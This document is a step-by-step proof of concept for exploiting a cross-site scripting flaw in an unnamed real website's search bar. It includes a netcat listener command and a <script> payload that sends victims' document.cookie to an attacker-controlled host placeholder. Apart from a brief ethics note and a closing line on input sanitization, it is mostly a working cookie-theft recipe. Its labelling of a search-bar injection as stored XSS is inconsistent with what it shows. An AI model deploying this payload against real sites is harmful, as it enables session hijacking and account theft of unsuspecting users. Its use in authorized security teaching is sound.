Proof of Concept: Basic XSS (Cross-Site Scripting) Vulnerability

Introduction

This document demonstrates a basic example of a Cross-Site Scripting (XSS) vulnerability using a real-world scenario. Specifically, it highlights how an XSS vulnerability in a web application's search bar can be exploited to steal cookies from unsuspecting users.

Overview

In this example, we will:

    Identify a vulnerable web application.
    Exploit the XSS vulnerability to execute malicious JavaScript.
    Capture the victim's cookies using a simple payload.

Note: The specific URL of the vulnerable website will not be shared for security reasons.

Steps to Exploit the XSS Vulnerability

1. Identify the Vulnerability

    Navigate to the Vulnerable Website: Visit the website and locate the search bar, which is the focus of our attack.
    Observe Input Handling: Confirm that the search bar does not sanitize user inputs, making it vulnerable to XSS attacks.

2. Set Up a Netcat Listener

To capture incoming connections, set up a netcat listener on your local machine. Use the following command in your terminal:

nc -nlvp 4444 

This will configure a listener to monitor port 4444 for incoming connections. Ensure that port forwarding is set up if you need to accept connections from outside your LAN.

3. Craft the Malicious Payload

Use the following JavaScript payload to exploit the vulnerability:

<script>
    new Image().src = "http://[ATTACKER_IP]:[ATTACKER_PORT]/cookie.php?" + document.cookie;
</script>

Explanation:

    This script creates an Image object and sets its src attribute to a URL controlled by the attacker.
    The URL includes the victim's cookies as query parameters, which are sent to the attacker’s server when the image request is made.

4. Deploy the Payload

    Insert the Payload: Paste the crafted payload into the vulnerable search bar and submit it.
    Monitor the Listener: Keep an eye on the netcat listener for incoming connections. The victim’s cookies will be sent to your server as part of the image request.

5. Capture and Analyze Cookies

Once the payload is executed by the victim, you will receive the cookie information in the netcat listener. This demonstrates how cookies can be stolen using an XSS attack.

Important Notes

    Stored XSS: This example demonstrates a stored XSS vulnerability, where the payload remains on the server and can affect multiple users.
    Ethical Use: This demonstration is intended to educate about XSS vulnerabilities. It is crucial to obtain proper authorization before testing or exploiting vulnerabilities on any system.

Conclusion

This proof of concept illustrates a basic XSS attack scenario and highlights the importance of input validation and sanitization in web applications. Protecting against XSS involves implementing robust security practices to ensure that user inputs are properly handled and malicious scripts are prevented from executing.
